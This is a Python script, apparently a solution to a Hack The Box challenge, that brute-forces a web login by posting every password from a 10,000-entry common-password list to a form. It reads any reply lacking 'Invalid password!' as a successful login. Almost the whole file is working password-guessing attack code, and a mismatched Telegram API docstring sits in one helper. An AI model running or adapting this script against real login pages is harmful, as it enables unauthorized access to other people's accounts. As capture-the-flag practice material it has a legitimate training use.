#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from __future__ import annotations

import json
import re
import sys
from http import HTTPStatus
from pathlib import Path
from typing import Dict

import requests

from logger import logger

REQ_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
}


def check_regex_response(response: str, regex: str) -> bool:
    """
    Metodo para comprobar si la respuesta contiene el texto esperado, que sera el que conocemos (el de contraseña
    invalida)
    :param response:
    :param regex:
    :return:
    """
    if not re.search(regex, response, re.IGNORECASE):
        logger.info("EXITO")
        return True
    return False


def make_request(request_url: str, method: str = 'post', form: Dict = None,
                 files: str = None) -> requests.models.Response:
    """
    Makes a request to the Telegram API.
    :param method_name: Name of the API method to be called. (E.g. 'getUpdates')
    :param method: HTTP method to be used. Defaults to 'get'.
    :param form: Optional parameters. Should be a dictionary with key-value pairs.
    :param files: Optional files.
    :return: The result parsed to a JSON dictionary.
    """

    connect_timeout = 3.5
    read_timeout = 9999

    try:
        # response = requests.post(request_url, data=form, headers=REQ_HEADERS, timeout=(connect_timeout, read_timeout))
        response: requests.models.Response = requests.request(method, request_url, headers=REQ_HEADERS, data=form,
                                                              files=files, timeout=(connect_timeout, read_timeout))
    except requests.exceptions.ConnectionError:
        logger.critical('ConnectionRefusedError: [Errno 111] Connection refused')
        sys.exit(-1)
    return response


def request_sync(url: str, username: str, password: str, my_json: Dict):
    logger.debug(f'Trying: user: "{username}", pass: "{password}"')

    response: requests.models.Response = make_request(url, form=my_json)

    if response.status_code == HTTPStatus.OK:
        valid: bool = check_regex_response(response.text, 'Invalid password!')
        if valid:
            logger.info(f'Trying: user: "{username}", pass: "{password}" -> Success')
            sys.exit(0)
        else:
            logger.info(f'Trying: user: "{username}", pass: "{password}" -> Fail')
    else:
        logger.error(response)
        logger.error(response.text)


def main():
    data: str = '''{"password": "%s"}'''  # %(pwd)
    name_password: str = 'password'
    name_username: str = ''

    logger.setLevel(20)  # INFO = 20
    # my_json = json.dumps(json.loads(data))
    my_json: Dict[str, str] = json.loads(data)

    file_username: Path = Path('user')
    file_password: Path = Path('password')
    file_password: Path = Path('10-million-password-list-top-10000.txt')

    user: str
    pwd: str
    for user in file_username.read_text().split('\n'):
        if len(user) == 0 and file_username in my_json.keys():  # si existe alguna liena en blanco
            break
        # Actualizamos el username si es necesario ponerlo
        if name_username in my_json.keys():
            my_json[name_username] = user

        for pwd in file_password.read_text().split('\n'):
            # if len(pwd) == 0:  # si existe alguna liena en blanco
            #    break
            # Actualizamos la contraseña
            if name_password in my_json.keys():
                my_json[name_password] = pwd

            url = 'http://docker.hackthebox.eu:32345'
            request_sync(url, user, pwd, my_json)


if __name__ == '__main__':
    main()
